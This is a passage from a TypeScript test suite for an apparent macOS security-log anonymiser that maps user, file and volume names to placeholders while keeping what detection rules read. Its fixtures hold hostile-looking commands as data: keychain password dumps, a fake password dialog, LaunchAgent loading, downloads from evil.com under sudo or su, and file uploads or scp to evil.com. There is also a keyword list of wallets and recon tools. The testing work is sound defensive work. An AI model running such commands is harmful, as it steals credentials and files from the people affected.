      // What the rules match as a phrase stays whole, even with other words in it, and even when a folder has that name.
      esCreate(zsh, { path: '/Users/jdoe/Documents/Gameleira Lab Safe Storage/y.txt' }, 15),
      run(545, '/usr/bin/security', ['security', 'find-generic-password', '-s', 'Gameleira Lab Safe Storage', '-w'], '/Users/jdoe/Documents', 16),
      run(546, '/usr/bin/security', ['security', 'find-generic-password', '-s', 'Exodus Backup', '-a', 'Brave Browser'], '/Users/jdoe/Documents', 17),
      run(547, '/bin/sh', ['sh', '-c', 'security find-generic-password -s "Gameleira Lab Safe Storage"'], '/', 18),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const args = events(r.out).filter(e => e.event.exec).map(e => e.event.exec.args as string[]);
    expect(args[0]).toEqual(['security', 'find-generic-password', '-s', 'Chrome Safe Storage', '-w']);
    expect(args[1]).toEqual(['osascript', '-e', 'display dialog "Update needed" default answer "" with hidden answer']);
    expect(args[2]).toEqual(['launchctl', 'load', '/Users/user1/Library/LaunchAgents/x.plist']);
    expect(args[3]!.slice(0, 2)).toEqual(['launchctl', 'load']);
    expect(args[3]![2]).toMatch(/^Volumes\/name\d+\.plist$/);
    expect(args[4]).toEqual(['sh', '-c', 'echo Chrome Safe Storage; echo load dialog answer']);
    expect(args[5]).toEqual(['security', 'find-generic-password', '-s', 'Gameleira Lab Safe Storage', '-w']);
    expect(args[6]).toEqual(['security', 'find-generic-password', '-s', 'Exodus Backup', '-a', 'Brave Browser']);
    // In shell text, which the rules do not read, the folder's name is a mapped name like any other.
    expect(args[7]).toEqual(['sh', '-c', `security find-generic-password -s "${keyed(r.key, 'name').get('Gameleira Lab Safe Storage')}"`]);
    sameFindings(input, r.out);
  });

  // The words come partly from src/rules/rules.ts itself, so a new recon tool or shell there fails this test until
  // PROTECTED in scripts/gameleira-clean.jq has it.
  test('words the rules look for stay outside paths, even when a folder has that name', () => {
    const sample = [
      'load', 'bootstrap', 'submit', 'disable', 'enable', 'display', 'dialog', 'hidden', 'answer', 'authonly', '-authonly',
      'Safe', 'Storage', 'Chrome', 'Chromium', 'Brave', 'Vivaldi', 'Opera', 'quarantine', 'com.apple.quarantine',
      'Exodus', 'Electrum', 'MetaMask', 'Ledger', 'Atomic', 'Wallet', 'Coinomi', 'find-generic-password', 'find-internet-password',
      'dump-keychain', 'unlock-keychain', 'export', 'add-trusted-cert', 'authorizationdb', 'write', 'deny', 'unspecified',
      'authenticated-root', 'clear', 'remove', 'empty', 'javascript', 'dgst', 'sha256', 'ripemd160', 'curl', 'wget', 'osascript',
      'python3', 'perl5.30', 'ruby', 'node', 'launchctl', 'xattr', 'base64', 'openssl', 'ditto', 'zip', 'tar', 'dscl', 'security',
      'spctl', 'csrutil', 'networksetup', 'xpcproxy',
      ...RECON_TOOLS.keys(), ...[...SHELLS].map(s => s.split('/').pop()!),
    ];
    const folders = sample.filter(w => !w.startsWith('-'));
    const input = [
      ...folders.map((w, i) => esCreate(zsh, { path: `/Users/jdoe/Documents/${w}/f.txt` }, i + 1)),
      esExec(child(550), userProc(550, '/usr/local/bin/tool', { pidversion: 2550 }), { args: ['tool', ...sample], cwd: '/Users/jdoe/Documents', env: JDOE_ENV, seq: 500 }),
      run(551, '/bin/sh', ['sh', '-c', sample.join(' ')], '/', 501),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const ev = events(r.out);
    expect(ev[folders.length]!.event.exec.args).toEqual(['tool', ...sample]);
    expect(ev[folders.length + 1]!.event.exec.args).toEqual(['sh', '-c', sample.join(' ')]);
  });

  test('the every-rule story run from a home folder', () => {
    const lab = spawnSync('/bin/bash', [path.resolve(__dirname, '..', 'scripts', 'gameleira-lab.sh'), 'synthetic', '--stdout']).stdout.toString('utf8');
    const moved = lines(lab).map(l => {
      const e = JSON.parse(l) as { event?: { exec?: { cwd?: { path: string } } } };
      if (e.event?.exec?.cwd) e.event.exec.cwd.path = '/Users/learner/Documents/Board';
      return JSON.stringify(e);
    }).join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input: moved });
    expect(r.status, r.stderr).toBe(0);
    expect(r.out).not.toContain('Board');
    const sig = findingSignature(buildModel(lines(moved)));
    expect(sig.size).toBeGreaterThan(5);
    expect(findingSignature(buildModel(lines(r.out)))).toEqual(sig);
  });

  test('two runs sharing a key give the same placeholders', () => {
    const key = path.join(tmpDir(), 'shared.key.tsv');
    const a = [
      esCreate(zsh, { path: '/Users/jdoe/Documents/Q3-acquisition.pdf' }, 1),
      esCreate(zsh, { path: '/Users/jdoe/Desktop/Merger/x.txt' }, 2),
    ].join('\n') + '\n';
    const b = [
      esCreate(zsh, { path: '/Users/jdoe/Downloads/Payroll.xlsx' }, 1),
      esCreate(zsh, { path: '/Users/jdoe/Downloads/Q3-acquisition.pdf' }, 2),
      run(560, '/usr/bin/osascript', ['osascript', '-e', 'open "Q3-acquisition.pdf"'], '/', 3),
    ].join('\n') + '\n';
    const ra = runClean(['clean', '-o', '-', '-k', key], { input: a });
    expect(ra.status, ra.stderr).toBe(0);
    const afterA = keyed(ra.key, 'name');
    const rb = runClean(['clean', '-o', '-', '-k', key], { input: b });
    expect(rb.status, rb.stderr).toBe(0);
    const q3 = afterA.get('Q3-acquisition.pdf')!;
    const ev = events(rb.out);
    expect(ev[0]!.event.create.destination.existing_file.path).toMatch(/^\/Users\/user1\/Downloads\/name\d+\.xlsx$/);
    expect(ev[1]!.event.create.destination.existing_file.path).toBe(`/Users/user1/Downloads/${q3}`);
    expect(ev[2]!.event.exec.args).toEqual(['osascript', '-e', `open "${q3}"`]);
    const num = (ph: string): number => Number(/\d+/.exec(ph)![0]);
    const payroll = keyed(rb.key, 'name').get('Payroll.xlsx')!;
    expect(num(payroll)).toBe(Math.max(...[...afterA.values()].map(num)) + 1);
    expect(keyed(rb.key, 'user')).toEqual(new Map([['jdoe', 'user1']]));
  });

  test('free text: quoted names with spaces, escaped spaces, $HOME, and chained paths', () => {
    const texts = [
      'echo "see /Users/jdoe/Secret Folder/x.pdf"',
      "echo 'see /Users/jdoe/Secret Folder/x.pdf' && ls",
      'ls /Users/jdoe/Secret\\ Folder/x.pdf | wc',
      'cat $HOME/Payroll/q.txt ${HOME}/Payroll/r.txt',
      '/Users/jdoe/Z5;/usr/bin/curl',
      '/usr/bin/x;/Volumes/Jdoe Passport/Z13',
      'osascript -e "do shell script \\"cp /Users/jdoe/Secret Folder/x.pdf /tmp/out\\""',
      'du -sh /Volumes/Jdoe Passport; echo done',
    ];
    const input = run(570, '/bin/sh', ['sh', ...texts], '/', 1) + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const n = keyed(r.key, 'name');
    const vol = keyed(r.key, 'volume').get('Jdoe Passport');
    expect(vol).toBe('vol1');
    const sf = `/Users/user1/${n.get('Secret Folder')}/${n.get('x.pdf')}`;
    expect(events(r.out)[0]!.event.exec.args).toEqual(['sh',
      `echo "see ${sf}"`,
      `echo 'see ${sf}' && ls`,
      `ls ${sf} | wc`,
      `cat $HOME/${n.get('Payroll')}/${n.get('q.txt')} \${HOME}/${n.get('Payroll')}/${n.get('r.txt')}`,
      `/Users/user1/${n.get('Z5')};/usr/bin/curl`,
      `/usr/bin/x;/Volumes/vol1/${n.get('Z13')}`,
      `osascript -e "do shell script \\"cp ${sf} /tmp/${n.get('out')}\\""`,
      'du -sh /Volumes/vol1; echo done',
    ]);
    for (const s of ['jdoe', 'Secret', 'Folder', 'Payroll', 'Passport', 'Z13', 'Z5']) expect(r.out, s).not.toContain(s);
  });

  test('keychain arguments of security are still cleaned of paths and mapped names, and keep what the rule reads', () => {
    const input = [
      esCreate(zsh, { path: '/Users/jdoe/Documents/x.txt' }, 1),
      run(590, '/usr/bin/security', ['security', 'unlock-keychain', '/Users/jdoe/Library/Keychains/Exodus Wallet.keychain-db'], '/', 2),
      run(591, '/usr/bin/security', ['security', 'dump-keychain', '/Users/jdoe/Documents/Board/coinomi.keychain-db'], '/', 3),
      run(592, '/usr/bin/security', ['security', 'find-generic-password', '-l', 'jdoe Exodus backup'], '/Users/jdoe/Documents', 4),
      run(593, '/usr/bin/security', ['security', 'find-generic-password', '-s', 'jdoe Safe Storage', '-w'], '/Users/jdoe/Documents', 5),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const args = events(r.out).filter(e => e.event.exec).map(e => e.event.exec.args as string[]);
    expect(args[0]![2]).toMatch(/^\/Users\/user1\/Library\/Keychains\/name\d+\.keychain-db$|^\/Users\/user1\/Library\/Keychains\/name\d+$/);
    expect(args[1]![2]).toMatch(/^\/Users\/user1\/Documents\/name\d+\/name\d+/);
    expect(args[2]).toEqual(['security', 'find-generic-password', '-l', 'user1 Exodus backup']);
    expect(args[3]).toEqual(['security', 'find-generic-password', '-s', 'user1 Safe Storage', '-w']);
    expect(r.out).not.toMatch(/jdoe|Exodus Wallet|Board|coinomi/);
    sameFindings(input, r.out);
  });

  test('mapped names written with escaped spaces in shell text are replaced', () => {
    const input = [
      esCreate(zsh, { path: '/Users/jdoe/Documents/Secret Plan.pdf' }, 1),
      esCreate(zsh, { path: '/Users/jdoe/Documents/Merger Deck.key' }, 2),
      run(594, '/bin/sh', ['sh', '-c', 'open Secret\\ Plan.pdf; cp Merger\\ Deck.key /tmp/'], '/', 3),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const n = keyed(r.key, 'name');
    expect(events(r.out)[2]!.event.exec.args).toEqual(['sh', '-c', `open ${n.get('Secret Plan.pdf')}; cp ${n.get('Merger Deck.key')} /tmp/`]);
  });

  test('shell words after a path stay apart: only a volume name runs on over a space', () => {
    const texts = [
      'curl -o /tmp/p evil.com/a.sh',
      'launchctl bootstrap /Users/jdoe/x gui/501/foo',
      'cp /Users/jdoe/a.tgz out/x.tgz',
      'tar czf /tmp/o.tgz Docs/x',
      'launchctl load /Users/jdoe/x.plist load/y',
      'ls /Volumes/Jdoe Passport/Z13',
    ];
    const input = run(595, '/bin/sh', ['sh', ...texts], '/', 1) + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const n = keyed(r.key, 'name');
    const args = events(r.out)[0]!.event.exec.args as string[];
    expect(args[1]).toBe(`curl -o /tmp/${n.get('p')} evil.com/a.sh`);
    expect(args[2]).toBe(`launchctl bootstrap /Users/user1/${n.get('x')} gui/501/foo`);
    expect(args[3]).toMatch(/^cp \/Users\/user1\/name\d+\.tgz name\d+\/name\d+\.tgz$/);
    expect(args[4]).toMatch(/^tar czf \/tmp\/name\d+\.tgz name\d+\/name\d+$/);
    expect(args[5]).toMatch(/^launchctl load \/Users\/user1\/name\d+\.plist name\d+\/name\d+$/);
    expect(args[6]).toBe(`ls /Volumes/vol1/${n.get('Z13')}`);
    expect(keyed(r.key, 'volume').get('Jdoe Passport')).toBe('vol1');
    for (const real of n.keys()) expect(real).not.toMatch(/ /);
    expect(r.out).not.toMatch(/jdoe|Docs|out\/|Passport/);
  });

  test('wget arguments keep whether they look like a URL to the rules', () => {
    const input = [
      run(596, '/usr/local/bin/wget', ['wget', 'Q3 Report/x'], '/Users/jdoe/Documents', 1),
      run(597, '/usr/local/bin/wget', ['wget', 'Merger_x/y'], '/Users/jdoe/Documents', 2),
      run(598, '/usr/local/bin/wget', ['wget', 'localhost:8080/x'], '/Users/jdoe/Documents', 3),
      run(599, '/usr/local/bin/wget', ['wget', 'intranet:8080/a.sh'], '/Users/jdoe/Documents', 4),
      run(600, '/usr/local/bin/wget', ['wget', 'intranet/a.sh'], '/Users/jdoe/Documents', 5),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const args = events(r.out).map(e => e.event.exec.args as string[]);
    expect(args[2]).toEqual(['wget', 'localhost:8080/x']);
    expect(args[3]).toEqual(['wget', 'intranet:8080/a.sh']);
    expect(args[4]).toEqual(['wget', 'intranet/a.sh']);
    expect(r.out).not.toMatch(/Q3|Report|Merger/);
    sameFindings(input, r.out);
  });

  test('wget option values are cleaned; only its positionals keep their URL look', () => {
    const input = [
      run(610, '/usr/local/bin/wget', ['wget', '-O', 'Merger-Plan.pdf', 'https://example.com/a'], '/Users/jdoe/Downloads', 1),
      run(611, '/usr/local/bin/wget', ['wget', '-O', 'Acme-Deal/out.sh', 'https://example.com/b'], '/Users/jdoe/Downloads', 2),
      run(612, '/usr/local/bin/wget', ['wget', '-i', 'Acme-urls.txt'], '/Users/jdoe/Downloads', 3),
      run(613, '/usr/local/bin/wget', ['wget', '--output-document=Acme-Deal.pdf', 'evil.com'], '/Users/jdoe/Downloads', 4),
      run(614, '/usr/local/bin/wget', ['wget', '-qO', 'Acme-Q3.zip', 'intranet/a.sh'], '/Users/jdoe/Downloads', 5),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const args = events(r.out).map(e => e.event.exec.args as string[]);
    expect(args).toHaveLength(5);
    expect(args[0]![2]).toMatch(/^name\d+\.pdf$/);
    expect(args[1]![2]).toMatch(/^name\d+\/name\d+\.sh$/);
    expect(args[2]![2]).toMatch(/^name\d+\.txt$/);
    expect(args[3]).toEqual(['wget', expect.stringMatching(/^--output-document=name\d+\.pdf$/), 'evil.com']);
    expect(args[4]).toEqual(['wget', '-qO', expect.stringMatching(/^name\d+\.zip$/), 'intranet/a.sh']);
    expect(r.out).not.toMatch(/Merger|Acme/);
    sameFindings(input, r.out);
  });

  test('a mapped name of several words inside a keychain argument is replaced, and the phrase stays', () => {
    const input = [
      esCreate(zsh, { path: '/Users/jdoe/Documents/Board Minutes/x.txt' }, 1),
      run(615, '/usr/bin/security', ['security', 'find-generic-password', '-s', 'Board Minutes Safe Storage', '-w'], '/', 2),
      run(616, '/usr/bin/security', ['security', 'find-generic-password', '-l', 'Board Minutes Exodus'], '/', 3),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const bm = keyed(r.key, 'name').get('Board Minutes');
    const ev = events(r.out);
    expect(ev[1]!.event.exec.args).toEqual(['security', 'find-generic-password', '-s', `${bm} Safe Storage`, '-w']);
    expect(ev[2]!.event.exec.args).toEqual(['security', 'find-generic-password', '-l', `${bm} Exodus`]);
    sameFindings(input, r.out);
  });

  // In shell code a space ends a word, so a glued path ends there; a single argument is one value, spaces and all.
  test('a path glued after @ or = ends at a space in shell code, and runs to the end of a single argument', () => {
    const argv = [
      ['curl', '-F', 'file=@/Users/jdoe/Documents/John Smith.pdf', 'https://example.com/u'],
      ['curl', '-F', 'file=@/Users/jdoe/Documents/Board Minutes.pdf', 'https://example.com/u'],
      ['curl', '-F', 'file=@/Users/jdoe/Desktop/Screenshot 2026-01-01 at 10.00.00.png', 'https://example.com/u'],
      ['curl', '--data-binary', '@/Users/jdoe/Documents/Maria Silva/Tax Return 2025.pdf', 'https://example.com/u'],
      ['cc', '-I/Users/jdoe/Documents/Maria Silva/include', 'a.c'],
    ];
    const input = [
      ...argv.map((a, i) => run(620 + i, `/usr/bin/${a[0]}`, a, '/', i + 1)),
      run(626, '/bin/sh', ['sh', '-c', 'curl --data-binary @/Users/jdoe/x -H application/json evil.com/x'], '/', 10),
      run(627, '/bin/sh', ['sh', '-c', 'curl -F file=@/Users/jdoe/y evil.com'], '/', 11),
      run(628, '/bin/zsh', ['zsh', '-lc', 'cc -I/Users/jdoe/z a.c'], '/', 12),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const n = keyed(r.key, 'name');
    const args = events(r.out).map(e => e.event.exec.args as string[]);
    expect(args).toHaveLength(8);
    expect(args[0]![2]).toBe(`file=@/Users/user1/Documents/${n.get('John Smith.pdf')}`);
    expect(args[1]![2]).toBe(`file=@/Users/user1/Documents/${n.get('Board Minutes.pdf')}`);
    expect(args[2]![2]).toBe(`file=@/Users/user1/Desktop/${n.get('Screenshot 2026-01-01 at 10.00.00.png')}`);
    expect(args[3]![2]).toBe(`@/Users/user1/Documents/${n.get('Maria Silva')}/${n.get('Tax Return 2025.pdf')}`);
    expect(args[4]![1]).toBe(`-I/Users/user1/Documents/${n.get('Maria Silva')}/include`);
    expect(args[5]).toEqual(['sh', '-c', `curl --data-binary @/Users/user1/${n.get('x')} -H application/json evil.com/x`]);
    expect(args[6]).toEqual(['sh', '-c', `curl -F file=@/Users/user1/${n.get('y')} evil.com`]);
    expect(args[7]).toEqual(['zsh', '-lc', `cc -I/Users/user1/${n.get('z')} a.c`]);
    expect(r.out).not.toMatch(/jdoe|Smith|Minutes|Screenshot|Maria|Silva|Return/);
    for (const real of ['x', 'y', 'z']) expect(n.has(real), real).toBe(true);
  });

  test('the attached value of a wget or curl short option is cleaned like a relative name', () => {
    const input = [
      run(630, '/usr/local/bin/wget', ['wget', '-OAcme-Deal.pdf', 'https://example.com/a'], '/Users/jdoe/Downloads', 1),
      run(631, '/usr/local/bin/wget', ['wget', '-PAcme-Dir/sub', 'https://example.com/b'], '/Users/jdoe/Downloads', 2),
      run(632, '/usr/bin/curl', ['curl', '-sLoAcme-Notes.txt', 'https://example.com/c'], '/Users/jdoe/Downloads', 3),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const args = events(r.out).map(e => e.event.exec.args as string[]);
    expect(args).toHaveLength(3);
    expect(args[0]![1]).toMatch(/^-Oname\d+\.pdf$/);
    expect(args[1]![1]).toMatch(/^-Pname\d+\/name\d+$/);
    expect(args[2]![1]).toMatch(/^-sLoname\d+\.txt$/);
    expect(r.out).not.toContain('Acme');
    sameFindings(input, r.out);
  });

  // ssh's own options take single values (a key file, a config file); only what follows the host is the remote command.
  test('ssh option values are single values, and only what follows the host is shell code', () => {
    const argv = [
      ['ssh', '-i', '/Users/jdoe/Documents/My Keys', 'host.example.com'],
      ['ssh', '-o', 'IdentityFile=/Users/jdoe/Documents/Board Keys', 'host.example.com'],
      ['ssh', '-F', '/Users/jdoe/Documents/Maria Cfg', 'host.example.com'],
      ['ssh', '-i/Users/jdoe/Documents/Acme Keys', 'host.example.com'],
      ['ssh', '-oIdentityFile=/Users/jdoe/Documents/Delta Keys', 'host.example.com'],
      ['ssh', '-vi', '/Users/jdoe/Documents/Omega Keys', '-p', '2222', 'host.example.com', 'cat /Users/jdoe/A B'],
      ['ssh', 'host.example.com', 'cat /Users/jdoe/A B'],
      // ssh reads options after the host too; the command starts at the first word that is not one.
      ['ssh', 'host.example.com', '-i', '/Users/jdoe/Documents/Sigma Keys', '-p', '2222', 'cat /Users/jdoe/A B'],
    ];
    const input = [
      ...argv.map((a, i) => run(640 + i, '/usr/bin/ssh', a, '/', i + 1)),
      run(650, '/usr/bin/ssh', ['ssh', '-i', 'Gamma Keys', 'host.example.com', 'cat /Users/jdoe/A B'], '/Users/jdoe/Documents', 20),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const n = keyed(r.key, 'name');
    const args = events(r.out).map(e => e.event.exec.args as string[]);
    expect(args).toHaveLength(9);
    expect(args[0]![2]).toBe(`/Users/user1/Documents/${n.get('My Keys')}`);
    expect(args[1]![2]).toBe(`IdentityFile=/Users/user1/Documents/${n.get('Board Keys')}`);
    expect(args[2]![2]).toBe(`/Users/user1/Documents/${n.get('Maria Cfg')}`);
    expect(args[3]![1]).toBe(`-i/Users/user1/Documents/${n.get('Acme Keys')}`);
    expect(args[4]![1]).toBe(`-oIdentityFile=/Users/user1/Documents/${n.get('Delta Keys')}`);
    expect(args[5]![2]).toBe(`/Users/user1/Documents/${n.get('Omega Keys')}`);
    expect(args[5]!.slice(3, 5)).toEqual(['-p', '2222']);
    // The remote command is shell code: a space ends a word there, so the name is A and B is a word of its own.
    expect(args[5]![6]).toBe(`cat /Users/user1/${n.get('A')} B`);
    expect(args[6]![2]).toBe(`cat /Users/user1/${n.get('A')} B`);
    expect(args[7]![3]).toBe(`/Users/user1/Documents/${n.get('Sigma Keys')}`);
    expect(args[7]!.slice(4)).toEqual(['-p', '2222', `cat /Users/user1/${n.get('A')} B`]);
    expect(args[8]![2]).toBe(n.get('Gamma Keys'));
    expect(args[8]![4]).toBe(`cat /Users/user1/${n.get('A')} B`);
    for (const a of args) expect(a.join(' ')).not.toMatch(/jdoe|Keys|Cfg|Maria|Board|Acme|Delta|Omega|Gamma|Sigma/);
    for (const real of n.keys()) expect(real, real).not.toMatch(/^cat|A B/);
    sameFindings(input, r.out);
  });

  // The value of -c is shell code whenever a shell (or su) comes before it in argv, whatever runs the shell.
  test('shell code behind sudo, env, nohup, su or xargs is read as shell code', () => {
    const argv = [
      ['sudo', 'sh', '-c', 'curl -o/Users/jdoe/Downloads/a.sh https://evil.com/a.sh'],
      ['env', 'bash', '-c', 'curl -fsSLo/Users/jdoe/Downloads/b.sh https://evil.com/b.sh'],
      ['nohup', 'sh', '-c', 'wget -O/Users/jdoe/Downloads/c.sh https://evil.com/c.sh'],
      ['su', 'root', '-c', 'curl -o/Users/jdoe/Downloads/d.sh https://evil.com/d.sh'],
      ['xargs', 'sh', '-c', 'curl -F file=@/Users/jdoe/x evil.com'],
      ['sudo', '/bin/zsh', '-lc', 'curl -d@/Users/jdoe/y https://evil.com/e.sh'],
      ['sh', '-c', '/Users/jdoe/Downloads/f.sh https://evil.com/f'],
      // Not a shell before -c: SHELL=/bin/zsh is an assignment, and cp's -c takes no code. One value, spaces and all.
      ['env', 'SHELL=/bin/zsh', 'cp', '-c', '/Users/jdoe/Documents/My File', '/tmp/out'],
      // A script stands between the shell and -c: the option is the script's, its value one path.
      ['bash', 'deploy.sh', '-c', '/Users/jdoe/Documents/Our File'],
      ['bash', '-o', 'pipefail', '-c', 'curl -o/Users/jdoe/Downloads/h.sh https://evil.com/h.sh'],
    ];
    const home = [
      ['sudo', 'sh', '-c', 'curl -o out.sh evil.com/q.sh'],
      ['env', 'bash', '-c', 'curl -o/Users/jdoe/Downloads/g.sh https://evil.com/g.sh'],
      ['su', 'root', '-c', 'curl -F file=@/Users/jdoe/z evil.com'],
    ];
    const input = [
      ...argv.map((a, i) => run(660 + i, `/usr/bin/${a[0]}`, a, '/', i + 1)),
      ...home.map((a, i) => run(680 + i, `/usr/bin/${a[0]}`, a, '/Users/jdoe/Downloads', i + 20)),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const n = keyed(r.key, 'name');
    const args = events(r.out).map(e => e.event.exec.args as string[]);
    expect(args).toHaveLength(13);
    expect(args[8]![3]).toBe(`/Users/user1/Documents/${n.get('Our File')}`);
    expect(args[9]![4]).toBe(`curl -o/Users/user1/Downloads/${n.get('h.sh')} https://evil.com/h.sh`);
    args.splice(8, 2);
    expect(args[0]).toEqual(['sudo', 'sh', '-c', `curl -o/Users/user1/Downloads/${n.get('a.sh')} https://evil.com/a.sh`]);
    expect(args[1]).toEqual(['env', 'bash', '-c', `curl -fsSLo/Users/user1/Downloads/${n.get('b.sh')} https://evil.com/b.sh`]);
    expect(args[2]).toEqual(['nohup', 'sh', '-c', `wget -O/Users/user1/Downloads/${n.get('c.sh')} https://evil.com/c.sh`]);
    expect(args[3]).toEqual(['su', 'root', '-c', `curl -o/Users/user1/Downloads/${n.get('d.sh')} https://evil.com/d.sh`]);
    expect(args[4]).toEqual(['xargs', 'sh', '-c', `curl -F file=@/Users/user1/${n.get('x')} evil.com`]);
    expect(args[5]).toEqual(['sudo', '/bin/zsh', '-lc', `curl -d@/Users/user1/${n.get('y')} https://evil.com/e.sh`]);
    expect(args[6]).toEqual(['sh', '-c', `/Users/user1/Downloads/${n.get('f.sh')} https://evil.com/f`]);
    expect(args[7]![4]).toBe(`/Users/user1/Documents/${n.get('My File')}`);
    expect(args[8]).toEqual(['sudo', 'sh', '-c', `curl -o ${n.get('out.sh')} evil.com/q.sh`]);
    expect(args[9]).toEqual(['env', 'bash', '-c', `curl -o/Users/user1/Downloads/${n.get('g.sh')} https://evil.com/g.sh`]);
    expect(args[10]).toEqual(['su', 'root', '-c', `curl -F file=@/Users/user1/${n.get('z')} evil.com`]);
    for (const real of ['a.sh', 'b.sh', 'c.sh', 'd.sh', 'f.sh', 'g.sh', 'x', 'y', 'z', 'My File']) expect(n.has(real), real).toBe(true);
    for (const real of n.keys()) expect(real, real).not.toMatch(/\s\S*(?:https?|evil|:\/\/|\.com)|^curl|^wget/);
    expect(r.out).not.toContain('jdoe');
    sameFindings(input, r.out);
  });

  // Run from a home folder, the relative names in shell code are names in that folder, word by word.
  test('relative names inside shell code are cleaned under a cleaned cwd', () => {
    const docs = '/Users/jdoe/Documents';
    const input = [
      esCreate(zsh, { path: `${docs}/HR/Pay.pdf` }, 1),
      run(700, '/usr/bin/sudo', ['sudo', 'sh', '-c', 'cat Secret/Minutes.pdf'], docs, 2),
      run(701, '/usr/bin/ssh', ['ssh', 'host.example.com', 'cat Secret/Minutes.pdf'], docs, 3),
      run(702, '/usr/bin/sudo', ['sudo', 'bash', 'deploy.sh', '-c', 'Board Docs/plan.pdf'], docs, 4),
      run(703, '/usr/bin/sudo', ['sudo', 'sh', '-c', 'cat HR/Pay.pdf'], docs, 5),
      run(704, '/bin/sh', ['sh', '-c', 'cat Acme/a.pdf 2>/dev/null > out/b.txt; zip -r deal.zip "Deal Room" && scp deal.zip bob@evil.com:/tmp/ | tee Notes/x.log'], docs, 6),
      run(705, '/bin/sh', ['sh', '-c', 'open Merger\\ Deck.key; rm Delta/*.pdf; curl -H "Accept: text/html" -o page.html https://evil.com/Delta/p.html'], docs, 7),
      run(706, '/bin/sh', ['sh', '-c', 'security find-generic-password -s "Chrome Safe Storage" -w; launchctl load gui/501/x; git commit -m wip'], docs, 8),
      // Not shell code: python's -c value keeps its relative names unless they are mapped, as before.
      run(707, '/usr/bin/python3', ['python3', '-c', 'print(open("Gamma/notes.txt").read())'], docs, 9),
      // From a kept cwd nothing says where a relative name is, so it stays.
      run(708, '/bin/sh', ['sh', '-c', 'cat Foo/bar.txt'], '/usr/local', 10),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const n = keyed(r.key, 'name');
    const args = events(r.out).filter(e => e.event.exec).map(e => e.event.exec.args as string[]);
    expect(args).toHaveLength(9);
    const minutes = `cat ${n.get('Secret')}/${n.get('Minutes.pdf')}`;
    expect(args[0]).toEqual(['sudo', 'sh', '-c', minutes]);
    expect(args[1]![2]).toBe(minutes);
    // deploy.sh stands between bash and -c, so -c is the script's own option and its value one name.
    expect(args[2]![4]).toBe(`${n.get('Board Docs')}/${n.get('plan.pdf')}`);
    expect(args[3]![3]).toBe(`cat ${n.get('HR')}/${n.get('Pay.pdf')}`);
    expect(args[4]![2]).toBe(`cat ${n.get('Acme')}/${n.get('a.pdf')} 2>/dev/null > ${n.get('out')}/${n.get('b.txt')}; zip -r ${n.get('deal.zip')} "${n.get('Deal Room')}" && scp ${n.get('deal.zip')} bob@evil.com:/tmp/ | tee ${n.get('Notes')}/${n.get('x.log')}`);
    expect(args[5]![2]).toBe(`open ${n.get('Merger Deck.key')}; rm ${n.get('Delta')}/*.pdf; curl -H "Accept: text/html" -o ${n.get('page.html')} https://evil.com/Delta/p.html`);
    expect(args[6]![2]).toBe('security find-generic-password -s "Chrome Safe Storage" -w; launchctl load gui/501/x; git commit -m wip');
    expect(args[7]![2]).toBe('print(open("Gamma/notes.txt").read())');
    expect(args[8]![2]).toBe('cat Foo/bar.txt');
    for (const a of args.slice(0, 6)) expect(a.join(' ')).not.toMatch(/Secret|Minutes|Board|Docs|plan|HR\/|Pay|Acme|Deal|Merger|Deck|Notes/);
    for (const real of n.keys()) expect(real, real).not.toMatch(/[*;|<>]|^cat|^zip|evil/);
    sameFindings(input, r.out);
  });

  // sudo -i and su -l run the shell with a dash before its name.
  test('a login shell (-zsh, -su) runs shell code like any shell', () => {
    const input = [
      run(710, '/bin/zsh', ['-zsh', '-c', 'curl -o/Users/jdoe/Downloads/a.sh https://evil.com/a.sh'], '/', 1),
      run(711, '/usr/bin/su', ['-su', '-c', 'curl -o/Users/jdoe/Downloads/b.sh https://evil.com/b.sh'], '/', 2),
      run(712, '/bin/bash', ['-bash', '-lc', 'curl -o/Users/jdoe/Downloads/c.sh https://evil.com/c.sh'], '/', 3),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const n = keyed(r.key, 'name');
    const args = events(r.out).map(e => e.event.exec.args as string[]);
    expect(args).toEqual([
      ['-zsh', '-c', `curl -o/Users/user1/Downloads/${n.get('a.sh')} https://evil.com/a.sh`],
      ['-su', '-c', `curl -o/Users/user1/Downloads/${n.get('b.sh')} https://evil.com/b.sh`],
      ['-bash', '-lc', `curl -o/Users/user1/Downloads/${n.get('c.sh')} https://evil.com/c.sh`],
    ]);
    for (const real of ['a.sh', 'b.sh', 'c.sh']) expect(n.has(real), real).toBe(true);
    sameFindings(input, r.out);
  });

  // The dash of a login shell is argv[0]'s: anywhere else, -sh or -su is a cluster of options (du -sh, grep -sh).
  test('an option cluster that ends in sh or su is not a shell, so the -c after it takes a plain value', () => {
    const docs = '/Users/jdoe/Documents';
    const input = [
      run(720, '/usr/bin/du', ['du', '-sh', '-c', 'Board Docs'], docs, 1),
